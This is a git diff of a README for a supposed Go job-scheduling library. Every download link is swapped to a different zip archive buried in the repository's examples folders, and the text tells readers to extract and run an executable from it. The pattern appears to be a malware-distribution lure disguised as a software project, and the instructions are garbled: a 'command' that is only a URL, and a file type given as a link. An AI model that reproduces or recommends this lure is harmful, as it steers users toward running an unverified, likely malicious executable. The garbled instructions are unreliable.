@@ -1,6 +1,6 @@
 # 🚀 scheduler - Effortless Job Scheduling for Everyone
 
-[![Download Scheduler](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip%20Scheduler-Here-brightgreen)](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip)
+[![Download Scheduler](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip%20Scheduler-Here-brightgreen)](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip)
 
 ## ✨ About This Project
 
@@ -30,7 +30,7 @@ Follow these steps to download and run Scheduler.
 
    Click this button to go to the releases page:
 
-   [![Download Scheduler](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip%20Scheduler-Here-brightgreen)](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip)
+   [![Download Scheduler](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip%20Scheduler-Here-brightgreen)](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip)
 
 2. **Choose the Latest Release:**
 
@@ -42,7 +42,7 @@ Follow these steps to download and run Scheduler.
 
 4. **Extract the Files:**
 
-   After downloading, locate the compressed file (usually `.zip` or `https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip`). Right-click on the file and select "Extract" or "Unzip" to get the Scheduler executable.
+   After downloading, locate the compressed file (usually `.zip` or `https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip`). Right-click on the file and select "Extract" or "Unzip" to get the Scheduler executable.
 
 5. **Run the Scheduler:**
 
@@ -57,7 +57,7 @@ Follow these steps to download and run Scheduler.
    If you are on Windows, you might need to run:
 
    ```
-   https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip
+   https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip
    ```
 
 6. **Check the Output:**
@@ -78,4 +78,4 @@ Scheduler offers a simple way to manage background jobs in your Go applications.
 
 Visit the releases page to download Scheduler now:
 
-[![Download Scheduler](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip%20Scheduler-Here-brightgreen)](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/thursdays/Software-3.0.zip)
+[![Download Scheduler](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip%20Scheduler-Here-brightgreen)](https://raw.githubusercontent.com/FelipeTTK/scheduler/main/examples/fridays/Software-v2.0.zip)
